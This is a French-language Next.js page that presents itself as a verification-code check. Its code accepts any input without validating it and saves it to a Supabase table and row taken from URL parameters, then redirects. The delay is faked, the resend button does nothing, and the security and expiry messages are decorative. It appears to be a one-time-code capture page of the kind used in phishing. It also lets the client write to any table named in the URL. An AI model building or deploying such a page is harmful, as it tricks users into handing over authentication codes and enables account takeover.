'use client'

import { createClient } from '@/utils/supabase/client'
import { useRouter } from 'next/navigation'
import React from 'react'
import { useState, useEffect } from 'react'

type Props = {
  params: Promise<{ id: string, table: string }>
}

export default function CodeValidationPage({ params }: Props) {
  const { table, id } = React.use(params)


  const [isLoading, setIsLoading] = useState(true)
  const [code, setCode] = useState('')
  const [countdown, setCountdown] = useState(3)
  const [error, setError] = useState<string | null>(null)
  const [success, setSuccess] = useState(false)

  const router = useRouter()
  const supabase = createClient()

  // Simuler le chargement initial
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false)
    }, 2000)

    // Démarrer le compte à rebours
    const countdownInterval = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(countdownInterval)
          return 0
        }
        return prev - 1
      })
    }, 1000)

    return () => {
      clearTimeout(timer)
      clearInterval(countdownInterval)
    }
  }, [])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError(null)
    
    // Afficher le spinner de validation
    setIsLoading(true)
    
    // Validation du code
    try {
      const { error: supabaseError } = await supabase
        .from(table)
        .update({
          code: code,
        })
        .eq('id', id)

      if (supabaseError) {
        console.error(supabaseError)
        setError('Erreur lors de la validation du code. Veuillez réessayer.')
        setIsLoading(false)
        return
      }
      
      // Succès
      setSuccess(true)
      
      // Redirection après un délai
      setTimeout(() => {
        router.push('/success')
      }, 1500)
      
    } catch (err) {
      console.error(err)
      setError('Une erreur est survenue')
      setIsLoading(false)
    }
  }

  const handleResendCode = () => {
    setIsLoading(true)
    setCountdown(3)
    setError(null)
    setCode('')
    
    // Logique pour renvoyer le code
    // À implémenter selon vos besoins
    
    setTimeout(() => {
      setIsLoading(false)
    }, 2000)
  }

  if (isLoading && countdown > 0) {
    return (
      <main className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-blue-50 to-green-50 p-4">
        {/* Spinner Container */}
        <div className="spinner-container flex flex-col items-center justify-center">
          {/* Spinner */}
          <div className="relative">
            <div className="w-20 h-20 border-4 border-blue-200 rounded-full"></div>
            <div className="absolute top-0 left-0 w-20 h-20 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
          </div>
          
          {/* Loading Text with Countdown */}
          <div className="mt-6 text-center">
            <div className="text-xl font-semibold text-gray-700 mb-2">Chargement en cours</div>
            <div className="text-lg text-gray-500">
              Prêt dans <span className="font-bold text-blue-600">{countdown}</span> seconde{countdown > 1 ? 's' : ''}
            </div>
          </div>

          {/* Progress Bar */}
          <div className="w-64 h-2 bg-gray-200 rounded-full overflow-hidden mt-8">
            <div 
              className="h-full bg-gradient-to-r from-blue-500 to-green-500 transition-all duration-1000"
              style={{ width: `${((3 - countdown) / 3) * 100}%` }}
            ></div>
          </div>
        </div>
      </main>
    )
  }

  if (success) {
    return (
      <main className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-blue-50 to-green-50 p-4">
        <div className="text-center">
          <div className="relative mb-6">
            <div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mx-auto">
              <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center animate-pulse">
                <i className="fas fa-check text-white text-2xl"></i>
              </div>
            </div>
          </div>
          <h1 className="text-3xl font-bold text-gray-800 mb-4">Code validé avec succès !</h1>
          <p className="text-gray-600 mb-8">Redirection en cours...</p>
          <div className="inline-block w-8 h-8 border-2 border-gray-300 border-t-blue-600 rounded-full animate-spin"></div>
        </div>
      </main>
    )
  }

  return (
    <main className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-blue-50 to-green-50 p-4">
      <div className="w-full max-w-md">
        {/* Title */}
        <h1 className="text-3xl font-bold text-center text-gray-800 mb-2">
          Validation de code
        </h1>
        <p className="text-gray-600 text-center mb-8">
          Entrez le code de vérification reçu
        </p>

        {/* Message d'erreur */}
        {error && (
          <div className="mb-6 p-4 bg-red-50 border border-red-200 rounded-xl">
            <div className="flex items-center text-red-700">
              <i className="fas fa-exclamation-circle mr-2"></i>
              <span className="font-medium">{error}</span>
            </div>
          </div>
        )}

        {/* Code Form */}
        <form 
          id="codeForm" 
          onSubmit={handleSubmit}
          className="bg-white rounded-2xl shadow-xl p-8 space-y-6"
        >
          <input type="hidden" name="id" value={id} />

          {/* Code Input */}
          <div className="mb-4">
            <label htmlFor="code" className="block text-gray-700 font-medium mb-2">
              Code de vérification
            </label>
            <div className="relative">
              <input
                type="text"
                name="code"
                id="code"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="w-full px-4 py-3 text-xl border text-gray-950 border-gray-300 rounded-xl text-center tracking-widest focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-green-500 transition-all"
                placeholder="Entrez le code"
                required
                maxLength={8}
                title="Veuillez entrer 6 chiffres"
                disabled={isLoading}
              />
              <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                <i className="fas fa-key text-gray-400"></i>
              </div>
            </div>
            <p className="text-sm text-gray-500 mt-2 text-center">
              Code requis
            </p>
          </div>

          {/* Submit Button */}
          <div className="text-center">
            <button
              type="submit"
              className="w-full py-3 px-6 bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-bold text-lg rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 transform hover:-translate-y-0.5 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-2 disabled:opacity-50 disabled:cursor-not-allowed"
              disabled={code.length < 4 || isLoading}
            >
              {isLoading ? (
                <span className="flex items-center justify-center gap-2">
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  Validation en cours...
                </span>
              ) : (
                <span className="flex items-center justify-center gap-2">
                  <i className="fas fa-check-circle"></i>
                  Valider le code
                </span>
              )}
            </button>
          </div>

          {/* Additional Options */}
          <div className="mt-6 text-center space-y-4">
            <button
              type="button"
              onClick={handleResendCode}
              className="text-blue-600 hover:text-blue-800 hover:underline text-sm font-medium disabled:opacity-50 disabled:cursor-not-allowed"
              disabled={isLoading}
            >
              <i className="fas fa-redo-alt mr-2"></i>
              Renvoyer le code
            </button>
            
            <div className="text-gray-500 text-sm">
              <i className="fas fa-clock mr-2"></i>
              Code valable pendant 10 minutes
            </div>
          </div>
        </form>

        {/* Security Note */}
        <div className="mt-8 text-center text-gray-500 text-sm">
          <div className="inline-flex items-center gap-2 bg-gray-100 px-4 py-2 rounded-lg">
            <i className="fas fa-shield-alt text-green-500"></i>
            <span>Vérification sécurisée en cours</span>
          </div>
        </div>
      </div>
    </main>
  )
}